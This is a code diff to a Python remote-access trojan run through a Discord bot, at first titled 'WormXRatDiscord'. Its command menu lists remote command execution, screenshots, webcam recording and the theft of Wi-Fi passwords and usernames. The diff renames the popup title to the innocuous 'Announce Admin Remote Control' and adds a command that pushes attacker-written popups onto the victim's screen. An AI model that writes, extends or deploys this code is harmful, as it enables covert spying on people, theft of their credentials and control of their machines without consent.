@@ -36,11 +36,11 @@ async def send_msg(channel, text):
         await channel.send(f"```\n{text}\n```")
 
 def show_popup(msg):
-    messagebox.showinfo("WormXRatDiscord", msg)
+    # 
+    messagebox.showinfo("Announce Admin Remote Control", msg)
 
 def record_camera_thread(cam_index, filename, channel_id):
     cap = cv2.VideoCapture(cam_index)
-    # Define codec and create VideoWriter object
     fourcc = cv2.VideoWriter_fourcc(*'XVID')
     out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
 
@@ -69,7 +69,7 @@ async def on_ready():
             f"Session: `{session}`\n"
             f"--- Commands ---\n"
             f"`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!stealusernames`\n"
-            f"`!showcameras` | `!recordcamera <num>` | `!stoprecordcamera` | `!chatsendmsg` "
+            f"`!showcameras` | `!recordcamera <num>` | `!stoprecordcamera` | `!chatsendmsg <text>`"
         )
         await channel_ref.send(header)
     except Exception as e:
@@ -82,9 +82,19 @@ async def on_message(message):
     if message.author == client.user: return
     if channel_ref is None or message.channel.id != channel_ref.id: return
 
+    # 
+    if message.content.startswith("!chatsendmsg "):
+        msg_text = message.content[13:].strip()
+        if msg_text:
+            #
+            threading.Thread(target=show_popup, args=(msg_text,), daemon=True).start()
+            await message.channel.send(f"✅ Popup sent: `{msg_text}`")
+        else:
+            await message.channel.send("❌ Usage: `!chatsendmsg <text>`")
+
     # --- Camera Commands ---
 
-    if message.content == "!showcameras":
+    elif message.content == "!showcameras":
         try:
             graph = FilterGraph()
             devices = graph.get_input_devices()
@@ -154,8 +164,6 @@ async def on_message(message):
                 await message.channel.send("Error: File was not created.")
             
             recording_threads[message.channel.id] = None
-
-    # 
 
     elif message.content == "!stealwifipasswords":
         try:
